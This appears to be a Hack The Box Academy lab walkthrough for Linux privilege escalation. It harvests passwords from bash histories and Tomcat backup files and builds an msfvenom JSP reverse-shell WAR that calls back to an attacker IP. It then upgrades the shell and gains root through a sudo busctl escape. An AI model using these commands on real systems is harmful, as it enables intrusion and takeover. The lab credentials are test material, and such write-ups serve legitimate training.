# Questions
SSH to 10.129.235.16 with user `htb-student` and password `Academy_LLPE!`.

### Question 1
`cat .bash_history`
```bash
id
ls
ls /var/www/html
cat /var/www/html/flag1.txt 
exit
```
`find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student`
Flag is found.

### Question 2
`cd /home/barry`
`cat .bash_history`
```
mysql -u root -p
tmux new -s barry
cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
ssh barry@IP
```

# Question 3
Now that we are barry, it mentions being an adm. Meaning this could be an admin being able to see the log files?
`cd /var/log`
`cat flag3.txt`

# Question 4
Hunting down the services on the box, came across this.
`cat /usr/share/tomcat9/etc/tomcat-users.xml`
```bash
<role rolename="manager-gui"/>
<role rolename="manager-script"/>
<role rolename="manager-jax"/>
<role rolename="manager-status"/>
<role rolename="admin"/>
<role rolename="admin-gui"/>

<user username="admin" password="admin" roles="admin,manager-gui,manager-script,admin-gui"/>
```
```bash
find / -name "*.bak" 2>/dev/null

/snap/core24/988/etc/.resolv.conf.systemd-resolved.bak
/etc/tomcat9/tomcat-users.xml.bak

cat /etc/tomcat9/tomcat-users.xml.bak
 <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
```

Logging in with the credentials,
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.153 LPORT=1234 -f war > payload.war`
Upload with a `netcat`. And bam shell.

# Question 5
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
Now have a proper shell.
`sudo -l`
I have access to `/usr/bin/busctl`
`sudo /usr/bin/busctl`
`/usr/bin/busctl`
Boom shell as root. 
`cat /root/flag5.txt`.